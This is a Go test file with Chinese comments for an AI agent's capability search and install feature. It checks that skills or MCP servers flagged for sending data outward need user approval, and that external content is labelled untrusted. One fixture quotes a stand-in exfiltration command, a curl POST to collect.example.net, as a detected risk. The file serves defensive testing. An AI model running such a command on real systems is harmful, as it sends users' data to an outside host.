package agent

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"

	"github.com/xiguac/atomhelper/internal/core"
	"github.com/xiguac/atomhelper/internal/kernel"
	"github.com/xiguac/atomhelper/internal/market"
	"github.com/xiguac/atomhelper/internal/policy"
	"github.com/xiguac/atomhelper/internal/skill"
	"github.com/xiguac/atomhelper/internal/skillscan"
)

// fakeLibrary 是 SkillLibrary 的测试替身。
type fakeLibrary []*skill.Skill

func (f fakeLibrary) GetSkill(_ context.Context, id string) (*skill.Skill, error) {
	for _, s := range f {
		if s.ID == id {
			return s, nil
		}
	}
	return nil, skill.ErrNotFound
}

func (f fakeLibrary) ListSkills(context.Context) ([]*skill.Skill, error) { return f, nil }

// fakeCapabilities 是 CapabilityService 的测试替身。
type fakeCapabilities struct {
	skillErr, serverErr error
	installErr          error
	// risks 非空时安装被搁置，带 accept 才装上。
	risks     []string
	installed []string
}

func (f *fakeCapabilities) SearchSkills(context.Context, string, int) ([]market.SkillHit, error) {
	return []market.SkillHit{{ID: "acme/skills/meeting-notes", Name: "meeting-notes"}}, f.skillErr
}

func (f *fakeCapabilities) SearchServers(context.Context, string, int) ([]market.ServerHit, error) {
	return []market.ServerHit{{Name: "app.example/weather", Installable: true}}, f.serverErr
}

func (f *fakeCapabilities) InstallSkill(_ context.Context, id string, accept bool) (*skill.Skill, *market.Pending, error) {
	if f.installErr != nil {
		return nil, nil, f.installErr
	}
	if len(f.risks) > 0 && !accept {
		return nil, &market.Pending{Kind: "skill", ID: id, Risks: f.risks}, nil
	}
	f.installed = append(f.installed, id)
	return &skill.Skill{ID: market.SkillID(id), Name: "meeting-notes"}, nil, nil
}

func (f *fakeCapabilities) InstallServer(_ context.Context, name string, accept bool) (*market.Server, []string, *market.Pending, error) {
	if f.installErr != nil {
		return nil, nil, nil, f.installErr
	}
	if len(f.risks) > 0 && !accept {
		return nil, nil, &market.Pending{Kind: "mcp", ID: name, Risks: f.risks}, nil
	}
	f.installed = append(f.installed, name)
	srv := market.ServerName(name)
	return &market.Server{Name: srv}, []string{srv + ".forecast"}, nil, nil
}

// PendingRisks 让它同时充当审批用的 InstallRisks。
func (f *fakeCapabilities) PendingRisks(string, string) []string { return f.risks }

func capStep(tool, params string) *core.Step {
	s := core.NewStep("t", 1, core.StepTool, json.RawMessage(params))
	s.ToolName = tool
	return s
}

func TestCapability_没启用就看不到这些工具(t *testing.T) {
	task := core.NewTask("t", "查一下天气", core.TrustUser)
	m := &fakeModel{replies: []string{`{"action":"finish","reason":"好"}`}}
	p := NewPlanner(m, catalogWith(core.SideEffectReadOnly), PlannerOptions{})
	if _, err := p.Decide(context.Background(), task, nil); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(m.lastReq.Messages[0].Content, ToolCapabilitySearch) {
		t.Fatal("没启用时不该出现查找能力的工具")
	}
}

func TestCapability_启用后给出工具做法和已安装的Skill(t *testing.T) {
	lib := fakeLibrary{{ID: "acme.skills.meeting-notes", Name: "meeting-notes", Goal: "整理会议纪要", Format: skill.FormatMarkdown, Raw: "正文"}}
	task := core.NewTask("t", "整理一下会议纪要", core.TrustUser)
	m := &fakeModel{replies: []string{`{"action":"tool","tool":"capability.install","params":{"kind":"skill","id":"a/b/c"}}`}}
	p := NewPlanner(m, catalogWith(core.SideEffectReadOnly), PlannerOptions{}).WithCapabilities(lib)
	d, err := p.Decide(context.Background(), task, nil)
	if err != nil {
		t.Fatal(err)
	}
	// 安装会留下东西，不是只读操作，要过审批这一关。
	if d.ToolName != ToolCapabilityInstall || d.SideEffect != core.SideEffectReversible {
		t.Fatalf("决策不对: %+v", d)
	}
	system := m.lastReq.Messages[0].Content
	for _, want := range []string{ToolCapabilitySearch, ToolCapabilityInstall, ToolSkillRead, "缺少能力时自己去找"} {
		if !strings.Contains(system, want) {
			t.Errorf("系统提示里应有 %q", want)
		}
	}
	var body strings.Builder
	for _, msg := range m.lastReq.Messages[1:] {
		body.WriteString(msg.Content)
	}
	if !strings.Contains(body.String(), "acme.skills.meeting-notes") || !strings.Contains(body.String(), "整理会议纪要") {
		t.Fatalf("已安装的 Skill 应列进上下文:\n%s", body.String())
	}
}

func TestCapability_绑定了Skill的任务不能自己装东西(t *testing.T) {
	bound := &skill.Skill{ID: "s", Name: "某流程", Goal: "g", RequiredTools: []string{"demo.weather"}, Steps: []string{"先装一个别的 Skill"}}
	task := core.NewTask("t", "g", core.TrustUser)
	task.Tags = []string{skill.TagPrefix + bound.ID}
	m := &fakeModel{replies: []string{
		`{"action":"tool","tool":"capability.install","params":{"kind":"skill","id":"a/b/c"}}`,
		`{"action":"tool","tool":"capability.install","params":{"kind":"skill","id":"a/b/c"}}`,
	}}
	p := NewPlanner(m, catalogWith(core.SideEffectReadOnly), PlannerOptions{}).
		WithSkills(fakeSkills{bound.ID: bound}).WithCapabilities(fakeLibrary{bound})
	if _, err := p.Decide(context.Background(), task, nil); err == nil {
		t.Fatal("别人写的流程没声明就不该能安装东西")
	}
	if strings.Contains(m.lastReq.Messages[0].Content, "缺少能力时自己去找") {
		t.Fatal("绑定了 Skill 的任务不该被告知可以自己找能力")
	}
}

func TestCapabilityDefaults_低风险的直接装有外传风险的一律要批准(t *testing.T) {
	p := NewPlanner(&fakeModel{}, catalogWith(core.SideEffectReadOnly), PlannerOptions{}).
		WithCapabilities(fakeLibrary{}).WithMail(true, true)
	task := core.NewTask("t", "帮我整理会议纪要", core.TrustUser)
	risks := &fakeCapabilities{risks: []string{"会把数据传到外部，SKILL.md 第 9 行：curl -X POST https://collect.example.net"}}
	check := func(pol *policy.Policy, h *fakeHistory, params string) (kernel.ApprovalOutcome, string) {
		t.Helper()
		CapabilityDefaults(pol)
		d, err := p.toolDecision(ToolCapabilityInstall, json.RawMessage(params), "")
		if err != nil {
			t.Fatalf("决策失败: %v", err)
		}
		out, reason, err := NewApprover(pol, policy.NewClassifier(), NewMemoryUsageTracker()).
			WithHistory(h).WithInstallRisks(risks).CheckAction(context.Background(), task, d)
		if err != nil {
			t.Fatalf("判定失败: %v", err)
		}
		return out, reason
	}
	const plain = `{"kind":"skill","id":"a/b/c"}`
	const accept = `{"kind":"skill","id":"a/b/c","accept_risk":true}`
	searched := doneStep(ToolCapabilitySearch, core.TrustExternal)
	mail := doneStep(ToolMailRead, core.TrustExternal)

	// 低风险的安装直接执行。该不该问看的是装的东西有没有风险，任务读过别的外部内容不影响。
	for _, h := range []*fakeHistory{{}, {steps: []*core.Step{searched}}, {steps: []*core.Step{mail, searched}}} {
		if out, reason := check(&policy.Policy{}, h, plain); out != kernel.ApprovalAuto {
			t.Fatalf("低风险的安装应直接执行，实际 %s（%s）", out, reason)
		}
	}
	// 有外传风险的：一律要用户批准，理由里把风险点列出来。
	out, reason := check(&policy.Policy{}, &fakeHistory{}, accept)
	if out != kernel.ApprovalManual || !strings.Contains(reason, "collect.example.net") || !strings.Contains(reason, "Skill a/b/c") {
		t.Fatalf("有外传风险的安装应由用户批准并列出风险点: %s（%s）", out, reason)
	}
	// 用户写了放行规则也放不过去。
	if out, _ := check(&policy.Policy{Rules: []policy.Rule{{Tool: ToolCapabilityInstall}}}, &fakeHistory{}, accept); out != kernel.ApprovalManual {
		t.Fatalf("任何规则都不该放行有风险的安装，实际 %s", out)
	}
	// 用户自己收紧了：低风险的也问。
	never := &policy.Policy{Rules: []policy.Rule{{Tool: ToolCapabilityInstall, Never: true}}}
	if out, _ := check(never, &fakeHistory{}, plain); out != kernel.ApprovalManual {
		t.Fatalf("用户设了始终确认就该确认，实际 %s", out)
	}
	// 搜索不该让别的改动也跟着免确认。
	send, err := p.toolDecision(ToolMailSend, json.RawMessage(`{"to":"a@example.com","subject":"s","body":"b"}`), "")
	if err != nil {
		t.Fatalf("决策失败: %v", err)
	}
	pol := &policy.Policy{Rules: []policy.Rule{{Tool: ToolMailSend}}}
	got, _, err := NewApprover(pol, policy.NewClassifier(), NewMemoryUsageTracker()).
		WithHistory(&fakeHistory{steps: []*core.Step{searched}}).CheckAction(context.Background(), task, send)
	if err != nil || got != kernel.ApprovalManual {
		t.Fatalf("搜索结果是外部内容，之后的发信应由用户确认: %s, %v", got, err)
	}
}

func TestActuator_查找安装与读取(t *testing.T) {
	ctx := context.Background()
	task := core.NewTask("t", "g", core.TrustUser)
	long := strings.Repeat("纪", skillReadChars+10)
	lib := fakeLibrary{{ID: "acme.skills.meeting-notes", Name: "meeting-notes", Goal: "g", Format: skill.FormatMarkdown, Raw: long}}
	caps := &fakeCapabilities{}
	a := NewActuator(&fakeTools{}, &fakeModel{}).WithCapabilities(caps, lib)

	res, err := a.Execute(ctx, task, capStep(ToolCapabilitySearch, `{"query":"meeting notes"}`))
	if err != nil {
		t.Fatalf("搜索失败: %v", err)
	}
	// 搜索结果是别人写的。
	if res.Trust != core.TrustExternal || !strings.Contains(string(res.Output), "acme/skills/meeting-notes") ||
		!strings.Contains(string(res.Output), "app.example/weather") {
		t.Fatalf("搜索结果不对: %s %s", res.Trust, res.Output)
	}

	// 一边查不通，另一边的结果照样给。
	caps.serverErr = errors.New("登记处不可达")
	res, err = a.Execute(ctx, task, capStep(ToolCapabilitySearch, `{"query":"x"}`))
	if err != nil || !strings.Contains(string(res.Output), "登记处不可达") || !strings.Contains(string(res.Output), "meeting-notes") {
		t.Fatalf("一边失败时应带着另一边的结果和错误: %s, %v", res.Output, err)
	}
	caps.skillErr = errors.New("Skill 库不可达")
	if _, err := a.Execute(ctx, task, capStep(ToolCapabilitySearch, `{"query":"x"}`)); err == nil {
		t.Fatal("两边都查不通应报错")
	}

	res, err = a.Execute(ctx, task, capStep(ToolCapabilityInstall, `{"kind":"mcp","id":"app.example/weather"}`))
	if err != nil || !strings.Contains(string(res.Output), "mcp-app-example-weather.forecast") {
		t.Fatalf("安装 MCP server 应返回它的工具: %s, %v", res.Output, err)
	}
	if _, err := a.Execute(ctx, task, capStep(ToolCapabilityInstall, `{"kind":"skill","id":"acme/skills/meeting-notes"}`)); err != nil {
		t.Fatalf("安装 Skill 失败: %v", err)
	}
	if strings.Join(caps.installed, ",") != "app.example/weather,acme/skills/meeting-notes" {
		t.Fatalf("安装的东西不对: %v", caps.installed)
	}
	// 有外传风险：不装，把风险点交回给模型；带 accept_risk 才装上。
	caps.risks = []string{"工具 x.share 会把你交给它的内容提交到这个外部服务"}
	res, err = a.Execute(ctx, task, capStep(ToolCapabilityInstall, `{"kind":"mcp","id":"app.example/risky"}`))
	if err != nil || res.Trust != core.TrustExternal ||
		!strings.Contains(string(res.Output), `"needs_approval":true`) || !strings.Contains(string(res.Output), "x.share") {
		t.Fatalf("有风险的安装应被搁置并说明风险: %s %s, %v", res.Trust, res.Output, err)
	}
	if len(caps.installed) != 2 {
		t.Fatalf("搁置的不该装上: %v", caps.installed)
	}
	res, err = a.Execute(ctx, task, capStep(ToolCapabilityInstall, `{"kind":"mcp","id":"app.example/risky","accept_risk":true}`))
	if err != nil || len(caps.installed) != 3 || strings.Contains(string(res.Output), "needs_approval") {
		t.Fatalf("批准后应装上: %s, %v", res.Output, err)
	}
	caps.risks = nil
	// 扫描没过：这一步失败，原因带回给模型。
	caps.installErr = skillscan.ErrUnsafe
	if _, err := a.Execute(ctx, task, capStep(ToolCapabilityInstall, `{"kind":"skill","id":"a/b/c"}`)); !errors.Is(err, skillscan.ErrUnsafe) {
		t.Fatalf("扫描没过应让这一步失败: %v", err)
	}

	// 读 Skill：长的分段，内容按外部内容对待。
	res, err = a.Execute(ctx, task, capStep(ToolSkillRead, `{"id":"acme.skills.meeting-notes"}`))
	if err != nil || res.Trust != core.TrustExternal {
		t.Fatalf("读取失败: %s, %v", res.Trust, err)
	}
	var first struct {
		Content    string `json:"content"`
		NextOffset int    `json:"next_offset"`
	}
	if err := json.Unmarshal(res.Output, &first); err != nil || first.NextOffset != skillReadChars {
		t.Fatalf("长 Skill 应分段返回: %+v, %v", first.NextOffset, err)
	}
	res, err = a.Execute(ctx, task, capStep(ToolSkillRead, `{"id":"acme.skills.meeting-notes","offset":6000}`))
	if err != nil || strings.Contains(string(res.Output), "next_offset") {
		t.Fatalf("最后一段不该再有 next_offset: %s, %v", truncate(string(res.Output), 80), err)
	}
	if _, err := a.Execute(ctx, task, capStep(ToolSkillRead, `{"id":"没有"}`)); !errors.Is(err, skill.ErrNotFound) {
		t.Fatalf("没装过的 Skill 应报告没有: %v", err)
	}
}
